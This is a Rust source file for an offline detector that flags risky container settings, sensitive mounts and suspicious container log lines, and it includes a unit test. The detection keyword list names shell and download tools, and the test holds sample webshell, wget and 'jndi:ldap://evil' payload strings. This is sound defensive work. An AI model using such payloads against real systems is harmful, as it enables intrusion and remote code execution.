use std::path::Path;

use crate::config::ResolvedRun;
use crate::error::Result;
use crate::model::{EvidenceQuality, Finding, ScoreBreakdown, Severity};
use crate::output::paths::OutputLayout;
use crate::output::writers::{self, RunLogger};
use crate::report::zh;

pub const RULE_CATEGORY: &str = "container_escape_risk";

#[derive(Debug, Default)]
pub struct ContainerDetectionReport {
    pub findings: Vec<Finding>,
    pub container_rows_seen: usize,
    pub mount_rows_seen: usize,
    pub log_rows_seen: usize,
    /// 容器日志 jsonl 中无法反序列化的坏行数（跳过但计数，不再静默丢弃）。
    pub malformed_rows: usize,
}

#[derive(Debug)]
struct ContainerRow {
    container_id: String,
    container_name: String,
    image: String,
    pod_name: String,
    namespace: String,
    is_privileged: bool,
    host_pid: bool,
    host_network: bool,
    risk_flags: String,
    line_number: u64,
}

#[derive(Debug)]
struct MountRow {
    container_id: String,
    container_name: String,
    source: String,
    destination: String,
    is_sensitive: bool,
    risk_flags: String,
    line_number: u64,
}

#[derive(Debug, serde::Deserialize)]
struct LogRow {
    event_id: String,
    timestamp: Option<String>,
    container_id: Option<String>,
    container_name: Option<String>,
    pod_name: Option<String>,
    namespace: Option<String>,
    message_summary: String,
    source_file: String,
    line_number: u64,
    raw_hash: String,
}

#[derive(Debug, serde::Serialize)]
struct ContainerFindingRow {
    finding_id: String,
    timestamp: String,
    severity: String,
    score: u16,
    category: String,
    container_id: String,
    container_name: String,
    rule_id: String,
    evidence_summary: String,
    recommendation: String,
}

struct FindingInput<'a> {
    index: usize,
    score: u16,
    category: &'a str,
    rule_id: &'a str,
    rule_name: &'a str,
    container_id: &'a str,
    container_name: &'a str,
    line_number: Option<u64>,
    timestamp: Option<String>,
    evidence_summary: String,
}

pub fn run_container_detection(
    resolved: &ResolvedRun,
    layout: &OutputLayout,
    logger: &mut RunLogger,
) -> Result<ContainerDetectionReport> {
    if !resolved.container_enabled() {
        return Ok(ContainerDetectionReport::default());
    }
    let containers = read_container_rows(&layout.containers)?;
    let mounts = read_mount_rows(&layout.mounts)?;
    let (logs, malformed_rows) = read_log_rows(&layout.container_logs)?;
    logger.log(format!(
        "detector: container inventory has {} container row(s), {} mount row(s), {} log row(s), {} malformed log row(s)",
        containers.len(),
        mounts.len(),
        logs.len(),
        malformed_rows
    ))?;

    let mut findings = Vec::new();
    for row in &containers {
        if row.is_privileged || row.host_pid || row.host_network {
            let mut flags = Vec::new();
            if row.is_privileged {
                flags.push("privileged");
            }
            if row.host_pid {
                flags.push("host_pid");
            }
            if row.host_network {
                flags.push("host_network");
            }
            let joined_flags = flags.join(";");
            findings.push(build_finding(FindingInput {
                index: findings.len() + 1,
                score: 65 + (flags.len() as u16 * 5),
                category: RULE_CATEGORY,
                rule_id: "CONTAINER-RUNTIME-001",
                rule_name: "Container uses high-risk runtime isolation settings",
                container_id: &row.container_id,
                container_name: &row.container_name,
                line_number: Some(row.line_number),
                timestamp: None,
                evidence_summary: format!(
                    "Container `{}` image `{}` recorded high-risk runtime flags `{}` in namespace `{}` pod `{}`. Treat as container risk context, not proof of compromise.",
                    display_or(&row.container_name, "unknown"),
                    display_or(&row.image, "unknown"),
                    display_or(&row.risk_flags, &joined_flags),
                    display_or(&row.namespace, "n/a"),
                    display_or(&row.pod_name, "n/a")
                ),
            }));
        }
    }
    for row in &mounts {
        if row.is_sensitive || row.risk_flags.contains("web_root_mount") {
            findings.push(build_finding(FindingInput {
                index: findings.len() + 1,
                score: if row.is_sensitive { 68 } else { 58 },
                category: "container_sensitive_mount",
                rule_id: "CONTAINER-MOUNT-001",
                rule_name: "Container mount exposes sensitive or Web-root host path",
                container_id: &row.container_id,
                container_name: &row.container_name,
                line_number: Some(row.line_number),
                timestamp: None,
                evidence_summary: format!(
                    "Container `{}` mounts host path `{}` to `{}` with flags `{}`. Treat as exposure context, not proof of compromise.",
                    display_or(&row.container_name, "unknown"),
                    display_or(&row.source, "unknown"),
                    display_or(&row.destination, "unknown"),
                    display_or(&row.risk_flags, "n/a")
                ),
            }));
        }
    }
    for row in &logs {
        if suspicious_log_message(&row.message_summary) {
            findings.push(build_finding(FindingInput {
                index: findings.len() + 1,
                score: 70,
                category: "container_log_suspicious",
                rule_id: "CONTAINER-LOG-001",
                rule_name: "Container log contains suspicious Web attack or command-execution evidence",
                container_id: row.container_id.as_deref().unwrap_or_default(),
                container_name: row.container_name.as_deref().unwrap_or_default(),
                line_number: Some(row.line_number),
                timestamp: row.timestamp.clone(),
                evidence_summary: format!(
                    "Container log event `{}` from namespace `{}` pod `{}` recorded suspicious message `{}`. Treat as suspicious container log evidence, not proof of compromise.",
                    row.event_id,
                    display_or(row.namespace.as_deref().unwrap_or_default(), "n/a"),
                    display_or(row.pod_name.as_deref().unwrap_or_default(), "n/a"),
                    display_or(&row.message_summary, "n/a")
                ),
            }));
            if let Some(finding) = findings.last_mut() {
                finding.source_file = Some(row.source_file.clone());
                finding.raw_hash = Some(row.raw_hash.clone());
            }
        }
    }
    write_suspicious_container_findings(&layout.container_findings, &findings)?;
    write_container_report(
        &layout.container_report,
        containers.len(),
        mounts.len(),
        logs.len(),
        &findings,
    )?;
    Ok(ContainerDetectionReport {
        findings,
        container_rows_seen: containers.len(),
        mount_rows_seen: mounts.len(),
        log_rows_seen: logs.len(),
        malformed_rows,
    })
}

fn build_finding(input: FindingInput<'_>) -> Finding {
    // 评分拆分只在专用字段记一次（container_score），不再 from_base 同值双记。
    let mut breakdown = ScoreBreakdown::default();
    breakdown.container_score = input.score as i16;
    Finding {
        finding_id: format!("CTR-F-{:06}", input.index),
        timestamp: input.timestamp,
        severity: Severity::from_score(input.score),
        score: input.score,
        confidence: crate::model::confidence_for(input.score, EvidenceQuality::Q1),
        evidence_quality: EvidenceQuality::Q1,
        evidence_quality_basis:
            "Q1 direct container node-side metadata or log evidence from supplied offline files"
                .to_string(),
        score_breakdown: breakdown,
        category: input.category.to_string(),
        rule_id: input.rule_id.to_string(),
        rule_name: input.rule_name.to_string(),
        source_type: "container".to_string(),
        source_file: Some(if input.container_id.is_empty() {
            "containers".to_string()
        } else {
            input.container_id.to_string()
        }),
        line_number: input.line_number,
        remote_ip: None,
        method: None,
        uri_path: None,
        status: None,
        evidence_summary: input.evidence_summary,
        raw_hash: None,
        related_ids: Vec::new(),
        evidence_chain_level: None,
        evidence_chain_basis: None,
        recommendation: format!(
            "Review container `{}` ({}) node-side metadata, image provenance, mounts, logs, and adjacent host/Web evidence before drawing conclusions.",
            display_or(input.container_name, "unknown"),
            display_or(input.container_id, "unknown id")
        ),
    }
}

fn read_container_rows(path: &Path) -> Result<Vec<ContainerRow>> {
    read_csv_rows(path, |line_number, get| ContainerRow {
        container_id: get("container_id"),
        container_name: get("container_name"),
        image: get("image"),
        pod_name: get("pod_name"),
        namespace: get("namespace"),
        is_privileged: parse_bool(&get("is_privileged")),
        host_pid: parse_bool(&get("host_pid")),
        host_network: parse_bool(&get("host_network")),
        risk_flags: get("risk_flags"),
        line_number,
    })
}

fn read_mount_rows(path: &Path) -> Result<Vec<MountRow>> {
    read_csv_rows(path, |line_number, get| MountRow {
        container_id: get("container_id"),
        container_name: get("container_name"),
        source: get("source"),
        destination: get("destination"),
        is_sensitive: parse_bool(&get("is_sensitive")),
        risk_flags: get("risk_flags"),
        line_number,
    })
}

/// 读入容器日志 jsonl，返回 (行, 坏行数)。坏行计数并跳过，不再静默丢弃。
fn read_log_rows(path: &Path) -> Result<(Vec<LogRow>, usize)> {
    if !path.exists() {
        return Ok((Vec::new(), 0));
    }
    let text = std::fs::read_to_string(path)?;
    let mut rows = Vec::new();
    let mut malformed = 0usize;
    for line in text.lines().filter(|line| !line.trim().is_empty()) {
        match serde_json::from_str::<LogRow>(line) {
            Ok(row) => rows.push(row),
            Err(_) => malformed += 1,
        }
    }
    Ok((rows, malformed))
}

fn read_csv_rows<T, F>(path: &Path, mut build: F) -> Result<Vec<T>>
where
    F: FnMut(u64, &dyn Fn(&str) -> String) -> T,
{
    if !path.exists() {
        return Ok(Vec::new());
    }
    let mut reader = csv::ReaderBuilder::new().flexible(true).from_path(path)?;
    let headers = reader
        .headers()?
        .iter()
        .map(normalize_header)
        .collect::<Vec<_>>();
    let mut rows = Vec::new();
    for (index, record) in reader.records().enumerate() {
        let Ok(record) = record else {
            continue;
        };
        let get = |name: &str| -> String {
            headers
                .iter()
                .position(|header| header == &normalize_header(name))
                .and_then(|position| record.get(position))
                .unwrap_or_default()
                .trim()
                .to_string()
        };
        rows.push(build(index as u64 + 2, &get));
    }
    Ok(rows)
}

fn write_suspicious_container_findings(path: &Path, findings: &[Finding]) -> Result<()> {
    let rows = findings
        .iter()
        .map(|finding| ContainerFindingRow {
            finding_id: finding.finding_id.clone(),
            timestamp: finding.timestamp.clone().unwrap_or_default(),
            severity: finding.severity.as_str().to_string(),
            score: finding.score,
            category: finding.category.clone(),
            container_id: finding.source_file.clone().unwrap_or_default(),
            container_name: String::new(),
            rule_id: finding.rule_id.clone(),
            evidence_summary: finding.evidence_summary.clone(),
            recommendation: finding.recommendation.clone(),
        })
        .collect::<Vec<_>>();
    if rows.is_empty() {
        writers::write_text(
            path,
            "finding_id,timestamp,severity,score,category,container_id,container_name,rule_id,evidence_summary,recommendation\n",
        )
    } else {
        writers::write_csv_serialize(path, &rows)
    }
}

fn write_container_report(
    path: &Path,
    containers: usize,
    mounts: usize,
    logs: usize,
    findings: &[Finding],
) -> Result<()> {
    let mut report = String::new();
    report.push_str("# 容器证据报告\n\n");
    report.push_str("- 容器证据基于用户提供的离线节点侧元数据和日志。\n");
    report.push_str("- 采集器不会进入容器、不会调用 Kubernetes API，也不会修改运行时状态。\n");
    report.push_str(&format!("- 容器行数：{containers}\n"));
    report.push_str(&format!("- 挂载行数：{mounts}\n"));
    report.push_str(&format!("- 容器日志事件数：{logs}\n"));
    report.push_str(&format!("- 容器发现数：{}\n\n", findings.len()));
    report.push_str("## 发现摘要\n\n");
    if findings.is_empty() {
        report.push_str("未产生容器发现。\n");
    } else {
        for finding in findings.iter().take(30) {
            report.push_str(&format!(
                "- [{}] {} 分数 {} 证据质量 {} 来源 {}\n",
                zh::severity_label(finding.severity.as_str()),
                finding.rule_id,
                finding.score,
                zh::evidence_quality_label(finding.evidence_quality.as_str()),
                finding.source_file.as_deref().unwrap_or("无数据")
            ));
        }
    }
    writers::write_text(path, &report)
}

/// 容器日志可疑消息判定。
/// 保守词表说明：
/// - 移除裸 "base64" 与 "deserialization"：应用日志里高频出现（如调试输出、
///   框架异常类名片段），作为子串匹配误报率过高；
/// - "cmd=" 收紧为 "cmd=/"、"/cmd"、"cmd=cd"、"cmd=whoami" 四个更具体形态，
///   覆盖典型 Webshell 命令执行（cmd=/bin/sh、cmd=cd、cmd=whoami），
///   同时避免把普通查询参数 cmd=list 之类计入；
/// - 其余保持攻击结构特征（路径穿越、SQL 结构、反连、jndi、webshell、eval 调用等）。
fn suspicious_log_message(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    [
        "../",
        "%2e%2e",
        "union select",
        "cmd=/",
        "/cmd",
        "cmd=cd",
        "cmd=whoami",
        "powershell",
        "/bin/sh",
        "wget ",
        "curl ",
        "bash -c",
        "jndi:",
        "webshell",
        "eval(",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn normalize_header(value: &str) -> String {
    value.trim().to_ascii_lowercase().replace(['-', ' '], "_")
}

fn parse_bool(value: &str) -> bool {
    matches!(
        value.trim().to_ascii_lowercase().as_str(),
        "true" | "1" | "yes"
    )
}

fn display_or<'a>(value: &'a str, fallback: &'a str) -> &'a str {
    if value.trim().is_empty() {
        fallback
    } else {
        value
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn suspicious_log_message_uses_conservative_cmd_forms() {
        // 典型 Webshell 命令执行形态仍命中。
        for message in [
            "GET /upload/avatar.jpg.php?cmd=/bin/sh HTTP/1.1 200",
            "GET /shell.php?/cmd=whoami HTTP/1.1 200",
            "cmd=cd /tmp && wget http://x/",
            "cmd=whoami",
            "error: SQL union select detected",
            "jndi:ldap://evil/x",
        ] {
            assert!(suspicious_log_message(message), "should hit: {message}");
        }
        // 误报样本不再命中：普通 base64 提及、反序列化异常类名、常规 cmd=list。
        for message in [
            "decoded base64 payload for internal cache warmup",
            "java.io.IOException: deserialization of response body skipped",
            "GET /api/items?cmd=list HTTP/1.1 200",
            "healthcheck ok",
        ] {
            assert!(
                !suspicious_log_message(message),
                "should not hit: {message}"
            );
        }
    }
}
